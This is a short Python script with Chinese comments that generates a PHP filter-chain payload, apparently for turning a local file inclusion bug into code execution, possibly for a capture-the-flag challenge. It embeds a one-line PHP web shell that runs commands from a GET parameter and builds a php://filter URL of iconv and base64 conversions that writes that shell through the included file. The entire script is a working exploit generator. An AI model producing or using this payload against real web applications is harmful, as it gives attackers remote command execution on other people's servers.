file_to_use = "./page/apple.php"  # 隨便一個保證存在、可讀的檔案即可，內容會被整個蓋掉

# <?php system($_GET[1]);?>a   <- 最後補個 'a' 是為了湊 base64 padding方便處理
import base64
payload = b"<?php system($_GET[1]);?>a"
base64_payload = base64.b64encode(payload).decode()

filters = "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.base64-encode|"
filters += "convert.iconv.UTF8.UTF7|"

for c in base64_payload[::-1]:
    filters += open('./res/' + c).read() + "|"
    filters += "convert.base64-decode|"
    filters += "convert.base64-encode|"
    filters += "convert.iconv.UTF8.UTF7|"

filters += "convert.base64-decode"

final_payload = f"php://filter/{filters}/resource={file_to_use}"
print(final_payload)